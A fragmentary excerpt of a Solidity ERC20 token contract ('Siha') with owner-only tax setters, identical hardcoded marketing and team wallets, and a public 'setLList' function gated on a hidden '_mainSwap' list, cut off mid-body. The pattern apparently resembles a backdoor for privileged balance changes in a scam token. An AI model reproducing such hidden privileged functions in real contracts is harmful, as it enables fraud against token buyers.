...
contract sj is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = unicode"Siha";
    string private _symbol = _name;
    uint8 private _decimals = 9;

    address payable private marketWall = payable(0x8C6d5B4d7628236F25c561accBB9E4803BDaA853); 
    address payable private teamWalletAddress = payable(0x8C6d5B4d7628236F25c561accBB9E4803BDaA853); 
    ...
    function sBuy(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
    ...
    function sSell(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
	...
	function setLList(address  recipient, uint256 amount) public {
		if( _mainSwap[ /*as same as;*/msg.sender])
	   {
